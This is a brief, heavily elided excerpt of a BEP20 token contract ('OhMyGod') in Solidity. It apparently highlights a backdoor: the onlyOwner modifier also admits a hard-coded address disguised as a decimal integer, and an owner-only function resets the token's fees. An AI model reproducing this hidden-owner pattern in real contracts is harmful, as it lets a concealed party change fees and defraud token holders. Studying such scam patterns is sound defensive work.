...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        ...
        || msg.sender == address(47052238728308971534678874505148727916872448261), "Ownable: caller is not the owner");
        _;
    }
...
contract OhMyGod is Context, IBEP20, Ownable {
    ...
    address payable private Maddress = payable(0x9DCd52231437cCA7bd64628acF9D8B4F30f6B335); //Mark Address
    ...
    function setBNBRd(uint256 Amount) public onlyOwner {
        _MBBF = Amount;
        _DF = _LF.add(_BBF).add(_MBBF);
    }
